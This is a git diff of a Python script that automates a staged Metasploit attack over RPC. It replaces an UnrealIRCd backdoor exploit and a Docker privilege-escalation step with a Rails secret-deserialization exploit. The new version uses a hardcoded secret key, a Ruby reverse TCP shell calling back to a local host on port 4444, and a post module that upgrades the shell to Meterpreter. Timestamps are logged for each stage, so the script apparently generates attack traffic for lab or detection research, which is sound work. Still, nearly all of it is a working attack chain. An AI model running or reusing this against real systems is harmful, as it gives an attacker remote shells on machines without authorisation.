@@ -12,7 +12,7 @@ def record_timestamp(folder, output_time_file):
 
 def main(argv):
     if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
+        print("Usage: {} Folder local_ip target_ip duration".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
@@ -20,32 +20,31 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
+    exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
+    payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
 
     exploit['RHOSTS'] = target_ip
-    exploit['RPORT'] = 6697
+    exploit['RPORT'] = 8181
+    exploit['TARGETURI'] = '/'
+    exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
     payload['LHOST'] = my_ip
     payload['LPORT'] = 4444
 
-    # start 1
     output_time_file = 'time_stage_1_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
+    # print('Start 1')
 
     exploit.execute(payload=payload)
 
     while client.jobs.list:
         time.sleep(1)
 
-    exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
-    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-    exploit['SESSION'] = 1
-    payload['LHOST'] = my_ip
-    payload['LPORT'] = 4444
+    # print(client.sessions.list['1'])
 
-    # print('Start 2')
-    exploit.execute(payload=payload)
+    exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
+    exploit['SESSION'] = 1
+    exploit.execute()
 
     while client.jobs.list:
         time.sleep(1)
